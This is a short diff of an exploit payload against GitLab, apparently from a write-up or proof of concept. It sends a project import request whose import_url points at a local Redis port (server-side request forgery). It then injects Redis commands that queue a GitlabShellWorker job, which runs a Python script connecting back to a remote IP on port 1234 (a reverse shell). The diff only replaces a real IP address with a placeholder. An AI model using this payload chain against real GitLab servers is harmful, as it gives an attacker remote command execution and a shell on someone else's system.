@@ -94,7 +94,7 @@ Upgrade-Insecure-Requests: 1
 utf8=%E2%9C%93&authenticity_token=p7JycLd%2FiS7nEk30Ahi2i8oyEodZJ0V%2BBhCWtnKMMauqjInDAYedeS%2BWL%2F8nP7At0sPOMoBE4NxGZxv7vOp%2FFA%3D%3D&project%5Bimport_url%5D=git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2Fssrf.git
  multi
  sadd resque:gitlab:queues system_hook_push
- lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|setsid python /tmp/nc.py 47.97.112.98 1234 \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
+ lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|setsid python /tmp/nc.py xxx.xxx.xxx.xxx 1234 \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
  exec
  exec
  exec
